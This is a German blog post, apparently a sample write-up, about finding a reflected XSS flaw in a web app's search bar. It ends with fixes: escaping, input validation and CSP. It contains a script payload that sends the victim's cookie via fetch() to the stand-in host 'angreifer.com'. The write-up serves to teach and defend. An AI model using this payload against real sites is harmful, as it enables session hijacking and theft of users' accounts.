layout: default title: Beispiel-Write-up - XSS-Schwachstelle in einer Webanwendung date: 2023-10-27 10:00:00 +0100 categories: [Web-Sicherheit] tags: [XSS, Webapp, Penetration-Test] description: Eine detaillierte Analyse, wie ich eine Reflected XSS-Schwachstelle in einer modernen Webanwendung identifiziert und ausgenutzt habe.
<article class="prose mx-auto my-12">
<h1>{{ page.title }}</h1>
<p>Veröffentlicht am {{ page.date | date: "%d. %B %Y" }} in {% for category in page.categories %}<span class="text-accent">{{ category }}</span>{% unless forloop.last %}, {% endunless %}{% endfor %}</p>

<p>In diesem Write-up analysiere ich eine Reflected Cross-Site Scripting (XSS)-Schwachstelle, die ich in der Suchfunktion einer Ziel-Webanwendung entdeckt habe. Diese Schwachstelle ermöglichte es, bösartigen JavaScript-Code im Browser eines Benutzers auszuführen, nachdem dieser auf einen speziell präparierten Link geklickt hatte.</p>

<h2>1. Erkundung und Schwachstellen-Identifizierung</h2>
<p>Der erste Schritt war die Untersuchung der Webanwendung. Ich habe mich auf die Suchleiste konzentriert, da sie häufig eine Quelle für XSS-Schwachstellen ist. Ich habe die Zeichenkette <code>&lt;script&gt;alert(1)&lt;/script&gt;</code> in die Suchleiste eingegeben und die URL beobachtet. Die Ausgabe wurde im HTML-Code der resultierenden Seite unzensiert reflektiert, was ein klares Anzeichen für eine Schwachstelle war.</p>

<figure class="my-8 text-center">
    
    <figcaption class="text-sm text-gray-400 mt-2">Darstellung einer erfolgreichen XSS-Exploit-Kette.</figcaption>
</figure>

<h2>2. Ausnutzung und Proof-of-Concept</h2>
<p>Nachdem die Schwachstelle bestätigt wurde, entwickelte ich einen Proof-of-Concept (PoC)-Code. Dieser PoC diente dazu, die Auswirkungen der Schwachstelle zu demonstrieren, ohne Schaden anzurichten. Ich erstellte einen Link, der bei Anklicken ein Cookie des Opfers stahl und es an einen von mir kontrollierten Server sendete:</p>

<pre><code>
&lt;script&gt;
    fetch('https://angreifer.com/?cookie=' + document.cookie);
&lt;/script&gt;
</code></pre>

<p>Dieser PoC bewies, dass die Schwachstelle nicht nur theoretisch war, sondern auch für die Übernahme von Benutzer-Sessions genutzt werden konnte.</p>

<h2>3. Risikobewertung und Empfehlungen</h2>
<p>XSS-Schwachstellen werden in der Regel als kritisch eingestuft, da sie zu Session-Hijacking, Phishing und der Manipulation von Inhalten führen können. Ich habe die folgenden Empfehlungen zur Behebung der Schwachstelle vorgeschlagen:</p>
<ul>
    <li>Implementierung einer korrekten Eingabevalidierung auf der Serverseite.</li>
    <li>Verwendung von Context-Aware-Escaping für alle Benutzereingaben, um zu verhindern, dass sie als HTML interpretiert werden.</li>
    <li>Aktivierung einer Content Security Policy (CSP), um das Ausführen von Inline-Skripten zu blockieren.</li>
</ul>

<p>Dieser Write-up zeigt, wie eine sorgfältige manuelle Untersuchung in Kombination mit automatisierten Tools zur Entdeckung kritischer Schwachstellen führen kann. Das Beheben solcher Fehler ist entscheidend für die Sicherheit jeder Webanwendung.</p>

</article>
